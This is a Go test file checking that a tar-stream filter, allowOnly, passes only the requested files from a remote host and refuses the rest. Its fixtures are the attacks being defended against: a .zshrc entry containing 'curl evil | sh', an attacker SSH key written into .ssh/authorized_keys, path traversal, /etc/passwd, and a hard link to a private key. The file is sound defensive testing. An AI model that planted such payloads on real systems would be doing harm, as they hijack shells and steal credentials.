package remote

import (
	"archive/tar"
	"bytes"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

type member struct {
	name, body, link string
	typ              byte
}

// tarOf builds a tar stream, the way a host's `tar -cf -` would send one.
func tarOf(t *testing.T, members ...member) []byte {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, m := range members {
		hdr := &tar.Header{Name: m.name, Mode: 0o644, Size: int64(len(m.body)), Typeflag: m.typ, Linkname: m.link}
		switch m.typ {
		case tar.TypeDir:
			hdr.Mode = 0o755
		case tar.TypeSymlink, tar.TypeLink:
			hdr.Size = 0
		case 0:
			hdr.Typeflag = tar.TypeReg
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(m.body)); err != nil && hdr.Size > 0 {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func namesIn(t *testing.T, stream []byte) []string {
	t.Helper()
	var names []string
	tr := tar.NewReader(bytes.NewReader(stream))
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			return names
		}
		if err != nil {
			t.Fatal(err)
		}
		names = append(names, hdr.Name)
	}
}

// What was asked for comes through whole: the names themselves, what is under
// them, links among them.
func TestAllowOnlyPassesRequestedNames(t *testing.T) {
	long := "report/" + strings.Repeat("deep/", 40) + "file.txt" // needs a PAX or GNU long name
	in := tarOf(t,
		member{name: "./report/", typ: tar.TypeDir},
		member{name: "./report/a.txt", body: "hello"},
		member{name: long, body: "x"},
		member{name: "./report/latest", typ: tar.TypeSymlink, link: "a.txt"},
		member{name: "./report/hard", typ: tar.TypeLink, link: "./report/a.txt"},
		member{name: "./notes.txt", body: "n"},
	)

	var out bytes.Buffer
	if err := allowOnly(bytes.NewReader(in), &out, []string{"report", "notes.txt"}); err != nil {
		t.Fatalf("allowOnly: %v", err)
	}
	if got, want := namesIn(t, out.Bytes()), namesIn(t, in); strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("names = %v, want %v", got, want)
	}

	tr := tar.NewReader(bytes.NewReader(out.Bytes()))
	_, _ = tr.Next()
	_, _ = tr.Next()
	body, _ := io.ReadAll(tr)
	if string(body) != "hello" {
		t.Fatalf("content = %q, want it copied through", body)
	}
}

// A hostile host answering a request for report.pdf with a key for the user's
// own ssh account is stopped at that entry, and nothing from it goes on.
func TestAllowOnlyStopsAtAnythingElse(t *testing.T) {
	for _, tt := range []struct {
		name string
		bad  member
	}{
		{"sibling", member{name: ".ssh/authorized_keys", body: "ssh-ed25519 AAAA attacker"}},
		{"dot sibling", member{name: "./.zshrc", body: "curl evil | sh"}},
		{"climbing out", member{name: "report.pdf/../../.ssh/authorized_keys", body: "x"}},
		{"absolute", member{name: "/etc/passwd", body: "x"}},
		{"prefix of the name", member{name: "report.pdf.bak", body: "x"}},
		{"hard link out", member{name: "report.pdf/k", typ: tar.TypeLink, link: ".ssh/id_ed25519"}},
	} {
		in := tarOf(t, member{name: "report.pdf", body: "pdf"}, tt.bad)
		var out bytes.Buffer
		err := allowOnly(bytes.NewReader(in), &out, []string{"report.pdf"})
		var unrequested *unrequestedError
		if !errors.As(err, &unrequested) {
			t.Errorf("%s: err = %v, want the entry refused", tt.name, err)
			continue
		}
		if bytes.Contains(out.Bytes(), []byte(tt.bad.body)) && tt.bad.body != "" && tt.bad.body != "x" {
			t.Errorf("%s: the refused entry's content was passed on", tt.name)
		}
	}
}

// A Mac host's tar packs a ._name file of extended attributes beside each
// name. It is that name's metadata, so it is dropped quietly — not refused, or
// every download from a Mac would fail — and not written either.
func TestAllowOnlyDropsAppleDouble(t *testing.T) {
	in := tarOf(t,
		member{name: "./._f.txt", body: "xattrs"},
		member{name: "./f.txt", body: "hello"},
		member{name: "./._other", body: "xattrs"},
	)
	var out bytes.Buffer
	err := allowOnly(bytes.NewReader(in), &out, []string{"f.txt"})
	var unrequested *unrequestedError
	if !errors.As(err, &unrequested) || !strings.Contains(err.Error(), "._other") {
		t.Fatalf("err = %v, want ._other (not beside a requested name) refused", err)
	}
	if got := namesIn(t, out.Bytes()); len(got) != 1 || got[0] != "./f.txt" {
		t.Fatalf("passed on %v, want only ./f.txt", got)
	}
}

func TestMemberRoot(t *testing.T) {
	for _, tt := range []struct{ in, want string }{
		{"a.txt", "a.txt"},
		{"./a.txt", "a.txt"},
		{"dir/sub/f", "dir"},
		{"./dir/", "dir"},
		{"dir/../other", "other"},
		{"../x", ""},
		{"a/../../x", ""},
		{"/etc/passwd", ""},
		{".", ""},
		{"", ""},
	} {
		if got := memberRoot(tt.in); got != tt.want {
			t.Errorf("memberRoot(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// End to end with the real local tar: a stream with an extra entry in it
// leaves that entry unwritten.
func TestAllowOnlyWithLocalTar(t *testing.T) {
	if _, err := exec.LookPath("tar"); err != nil {
		t.Skip("no tar on PATH")
	}
	dest := t.TempDir()
	in := tarOf(t,
		member{name: "./report.pdf", body: "pdf"},
		member{name: ".ssh/authorized_keys", body: "ssh-ed25519 AAAA attacker"},
	)

	pr, pw := io.Pipe()
	cmd := exec.Command("tar", "-C", dest, "-x", "-o", "-f", "-")
	cmd.Stdin = pr
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	err := allowOnly(bytes.NewReader(in), pw, []string{"report.pdf"})
	_ = pw.CloseWithError(err)
	_ = cmd.Wait()

	if err == nil {
		t.Fatal("the extra entry was not refused")
	}
	if _, statErr := os.Stat(filepath.Join(dest, ".ssh", "authorized_keys")); statErr == nil {
		t.Fatal("the unrequested file was written")
	}
}
